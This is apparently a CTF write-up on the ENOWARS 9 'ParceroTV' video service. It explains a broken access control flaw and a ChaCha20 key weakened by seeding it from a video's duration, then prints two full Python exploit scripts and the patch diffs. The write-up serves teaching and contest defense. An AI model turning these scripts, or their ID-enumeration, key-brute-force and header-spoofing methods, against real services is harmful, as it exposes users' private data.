---
title: "ENOWARS 9"
date: 2025-07-29T00:00:00+00:00
# weight: 1
# aliases: ["/first"]
tags: ["attack-defense", "ctf", "crypto", "web", "enowars"]
author: "AlBovo"
# author: ["Me", "You"] # multiple authors
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "Some writeups of the ENOWARS 9th edition."
canonicalURL: "https://albovo.github.io/en/ctf/"
disableHLJS: false
disableShare: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/AlBovo/CTF-Writeups" # image path/url
    alt: "ENOWARS 9" # alt text
    caption: "Some writeups of the ENOWARS 9th edition." # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/AlBovo/AlBovo.github.io/blob/main/content/en"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---
# ENOWARS 9 🚩
![enowars logo](/images/enowars.png)

## ParceroTV 🌐

### Overview

**ParceroTV** was a video-sharing web application, similar to a small-scale YouTube, built with a **Rust** backend using the **Actix-web** framework and a **SQLite** database. The service allowed users to register, log in, and upload videos and "shorts." Videos could be marked as public or private, and users could create playlists, comment on videos, and view other users' profiles. The application also featured a "shorts" functionality with auto-generated captions in Spanish.

### Analysis & Vulnerabilities

The service contained two critical vulnerabilities: a Broken Access Control issue that allowed access to other users' private videos, and an insecure cryptography implementation in the shorts captioning system.

#### Vulnerability 1: Broken Access Control in Private Video API

The primary vulnerability was found in the API endpoint responsible for retrieving a user's private videos: `/get_private_videos/{user_id}`. The handler for this route took a user ID directly from the URL path and used it to query the database for all associated private videos.

The critical flaw was the **complete lack of authorization checks**. The code did not verify if the `user_id` provided in the URL matched the `user_id` of the currently authenticated user stored in the session. This meant that any logged-in user could enumerate and access the metadata of any other user's private videos simply by guessing or obtaining their user ID.

This was made trivial by another endpoint, `/get_user_info_with_name/{name}`, which returned a user's information, including their ID, based on their username.

The exploitation path was as follows:
1.  An attacker registers a new account on the platform.
2.  The attacker uses the `/get_user_info_with_name/{victim_username}` endpoint to retrieve the victim's unique `user_id`.
3.  The attacker then makes a request to `/get_private_videos/{victim_user_id}`.
4.  The API would improperly authorize this request and return a JSON object containing the metadata of all the victim's private videos, one of which contained the flag hidden inside its description field, encoded using Brainfuck.

#### Vulnerability 2: Insecure Cryptography in Shorts Captions

The second vulnerability was in the "shorts" feature. When a user uploaded a short with captions, the backend would "translate" them into Spanish and save them as a `.vtt` file. This process involved a custom encryption scheme.

The analysis of the `NPI_hecker404_parceroTV_shorts.py` exploit script and the backend source code (`shorts_lib.rs`) revealed that the encryption was critically flawed:
1.  **Predictable Key Generation**: The 256-bit ChaCha20 encryption key was derived directly from the short's duration in seconds (a `float` value). This value was cast to milliseconds, and the resulting integer was used as a seed. This created an extremely small and predictable keyspace, making it trivial to brute-force the key by trying common duration values.
2.  **Custom Encoding**: Before encryption, the plaintext was encoded into a series of Spanish words using a fixed dictionary of 4096 words (`spanish_words.txt`). Each word represented a 12-bit chunk of the original data.

The exploitation path was:
1.  The attacker finds a target short with captions by querying the `/get_shorts` endpoint.
2.  They download the encrypted `.vtt` caption file.
3.  They reverse the Spanish word encoding to retrieve the raw ciphertext.
4.  They brute-force the video duration (the exploit script successfully used values like `4.6` and `2.5` seconds) to generate the correct ChaCha20 key.
5.  With the correct key, they decrypt the ciphertext to reveal the Brainfuck payload containing the flag.

### Exploits

Here you can read the actual exploits I've written with NPI.

```python
#!/bin/env python3

from pwn import *
import requests
import sys
import json
import string
import random

service_name = 'parceroTV'
ip = sys.argv[1]

alph = string.ascii_uppercase + string.digits

if service_name:
    attacksjson = requests.get(f'https://9.enowars.com/scoreboard/attack.json').json()
    getid = attacksjson['services'][service_name][ip]


def add_metadata(input_path: str,
                 output_path: str,
                 title: str = None,
                 artist: str = None,
                 genre: str = None) -> None:
    cmd = ["ffmpeg", "-i", input_path]

    if title:
        cmd += ["-metadata", f"title={title}"]
    if artist:
        cmd += ["-metadata", f"artist={artist}"]
    if genre:
        cmd += ["-metadata", f"genre={genre}"]

    cmd += ["-c", "copy", output_path]

    subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def brainfuck(input):
    ...
    return output

def attack(fid=None):
    try:
        username_f = fid['0'][0]
        URL = f'http://{ip}:7777'
        assert username_f is not None, "User ID must be set"

        username, password = ''.join(random.choices(alph, k=12)), ''.join(random.choices(alph, k=12))
        s = requests.Session()
        s.headers.update({'User-Agent': 'python-httpx/0.23.3', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'})
        s.get(URL)
        s.post(URL + '/newuser', data={'username': username, 'password': password})
        s.post(URL + '/checkcredentials', data={'username': username, 'password': password})

        userid = s.get(URL + f'/get_user_info_with_name/{username_f}').json()['id']

        video = s.get(URL + f'/get_private_videos/{userid}').json()[0]
        a = f'metadata_{video['name']}_{''.join(random.choices(string.digits, k=4))}.mp4'

        m = [
            video['name'],
            username_f,
            video['location']
        ]

        add_metadata('video.mp4', a, title=m[0], artist=m[1], genre=m[2])

        s.post(URL + '/app/create_video', data={
            'name': video['name'],
            'description': os.urandom(12).hex(),
            'is_private': 1,
            'location': video['location'],
            
        }, files={
            'file': open(a, 'rb'),
            'thumbnail': open('thumbnail.png', 'rb')
        })

        print(f'{a}', flush=True)
        path = '/get_video_info/' + s.get(URL + '/get_my_videos').json()[0]['path']
        print(brainfuck(s.get(URL + path).json()['description']), flush=True)
    except:
        pass

if getid:
    for round in getid:
        attack(getid[round])
else:
    attack()
```

And

```python
#!/usr/bin/env python3

import requests, re, sys, random, string
from pathlib import Path
from typing import List, Dict, Set
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
from cryptography.hazmat.backends import default_backend

PER_LETTER = 4096 // 26
alph = string.ascii_uppercase + string.digits


def brainfuck(input):
    ...
    return output

def build_spanish_words(path: str = "spanish_words.txt") -> List[bytes]:
    raw = Path(path).read_bytes()
    all_words = [w.strip() for w in raw.splitlines() if w.strip()]
    
    groups: Dict[bytes, List[bytes]] = {}
    for w in all_words:
        first = w[0:1].lower()
        if b'a' <= first <= b'z':
            groups.setdefault(first, []).append(w)
    
    used: Set[bytes] = set()
    result: List[bytes] = []
    
    for letter_ord in range(ord(b'a'), ord(b'z') + 1):
        letter = bytes([letter_ord])
        bucket = groups.get(letter, [])
        for w in bucket[:PER_LETTER]:
            if w not in used:
                used.add(w)
                result.append(w)
    
    for w in all_words:
        if len(result) >= 4096:
            break
        if w not in used:
            used.add(w)
            result.append(w)
    
    if len(result) != 4096:
        raise ValueError(f"Expected 4096 words, got {len(result)}")
    
    return result


def decrypt_spanish_stream(
    cipher_words: List[bytes],
    duration_secs: float,
    words_file: str = "spanish_words.txt"
) -> str:
    table = build_spanish_words(words_file)
    inv_table = {w: i for i, w in enumerate(table)}

    bit_buf = 0
    bit_count = 0
    cipher_bytes = bytearray()

    for w in cipher_words:
        try:
            idx = inv_table[w]
        except KeyError:
            # This should not happen with the corrected byte handling
            continue
        if idx >= 4096:
            raise ValueError(f"Word index out of range: {idx}")
        bit_buf = (bit_buf << 12) | idx
        bit_count += 12

        while bit_count >= 8:
            bit_count -= 8
            byte = (bit_buf >> bit_count) & 0xFF
            cipher_bytes.append(byte)


    ms = int(round(duration_secs * 1000.0))
    if ms == 0:
        ms = 1
    seed = ms.to_bytes(8, "little") + b"\x00" * 24

    key = seed
    nonce = b"\x00" * 16
    cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None, backend=default_backend()).encryptor()

    keystream = cipher.update(b"\x00" * len(cipher_bytes) * 8)

    plain_bytes = bytearray()
    for i, cb in enumerate(cipher_bytes):
        kb = keystream[i * 8]
        plain_bytes.append(cb ^ kb)
    
    return plain_bytes.decode("utf-8", errors="ignore")


session = requests.Session()
session.headers.update({'User-Agent': 'python-httpx/0.23.3', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'})

def extract_vtt_text(vtt_content: bytes) -> List[bytes]:
    lines = vtt_content.splitlines()
    text_lines = []
    for line in lines:
        if re.match(br'^\d+$', line):
            continue
        if re.match(br'^\d{2}:\d{2}:\d{2}\.\d{3} --> \d{2}:\d{2}:\d{2}\.\d{3}$', line):
            continue
        if line.strip() == b"":
            continue
        if line.startswith(b'WEBVTT'):
            continue
        text_lines.append(line.strip())
    
    # Join all text lines and then split into words
    full_text = b' '.join(text_lines)
    return full_text.split()

assert len(sys.argv) == 2
TEAM_IP = sys.argv[1]
service_name = 'parceroTV'

attacksjson = requests.get(f'https://9.enowars.com/scoreboard/attack.json').json()['services'][service_name][TEAM_IP]
URL = f'http://{TEAM_IP}:7777'

for rnd in attacksjson.items():
    vtt_file = rnd[1]['1'][0]
    username, password = ''.join(random.choices(alph, k=12)), ''.join(random.choices(alph, k=12))

    session.get(URL)
    session.post(URL + '/newuser', data={'username': username, 'password': password})
    session.post(URL + '/checkcredentials', data={'username': username, 'password': password})

    r = session.get(URL + '/get_shorts').json()
    c = None
    for i in r:
        if i['name'] == vtt_file:
            c = i['caption_path']
            break
    
    if c:
        vtt_raw = session.get(URL + c).content
        encrypted = extract_vtt_text(vtt_raw)

        durations = [4.6, 2.5]
        for d in durations:
            f = decrypt_spanish_stream(encrypted, d, words_file="spanish_words.txt")
            if f.startswith('@') and f.endswith('@'):
                print(brainfuck(f), flush=True)
```

### Patches

The staged git changes show that the Broken Access Control vulnerability was patched in `backend/src/main.rs`.

1.  **Patch for Private Video Access**: The `get_private_videos_by_userid` function was modified to include a crucial authorization check. It now compares the `user_id` from the session with the `user_id` from the URL. If they do not match, the request is rejected.

    ```diff
    --- a/backend/src/main.rs
    +++ b/backend/src/main.rs
    @@ -654,8 +654,11 @@ async fn get_private_videos_by_userid(
         pool: web::Data<Pool>,
         user_id: web::Path<i32>,
     ) -> Result<impl Responder, Error> {
         if let Ok(Some(_user_id)) = session.get::<i32>("user_id") {
    -        let conn = get_db_conn(&pool).await?;
             let user_id = user_id.into_inner();
    +        if _user_id != user_id {
    +            return Ok(redirect!("/no_permission"));
    +        }
    +        let conn = get_db_conn(&pool).await?;
             let videoss = web::block(move || select_private_videos_by_userid(conn, user_id))
                 .await?
                 .map_err(error::ErrorInternalServerError)?;

    ```

2.  **Defense-in-Depth for Video Info**: A similar check was added to the `/get_video_info/{path:.*}` endpoint. This patch ensures that only the owner of a video can fetch its detailed metadata, preventing potential information leaks even if an attacker found another way to access a video path.

    ```diff
    --- a/backend/src/main.rs
    +++ b/backend/src/main.rs
    @@ -738,6 +741,9 @@ async fn get_video_info(
             let video_info = web::block(move || select_video_by_path(conn, &path))
                 .await?
                 .map_err(error::ErrorInternalServerError)?;
    +            if video_info.userId != user_id {
    +                return Ok(redirect!("/no_permission"));
    +            }
             Ok(HttpResponse::Ok().json(video_info))
         }
     } else {

    ```

No patches were found in the staged changes for the insecure cryptography vulnerability in the shorts captioning system. This suggests the vulnerability might have been overlooked or was intended to be patched in a different commit.

### Network-level Defense

In addition to the code-level patches, we implemented a network-level defense. We configured our reverse proxy to inspect incoming HTTP requests. By identifying the specific `User-Agent` and other headers used by the game's checker, we created a filtering rule. Any request to the service that did not match the checker's header profile was blocked. This effectively mitigated simple scripted attacks and forced adversaries to craft more sophisticated exploits that correctly mimicked the checker's traffic, as demonstrated by the `User-Agent` header present in the provided exploit scripts. 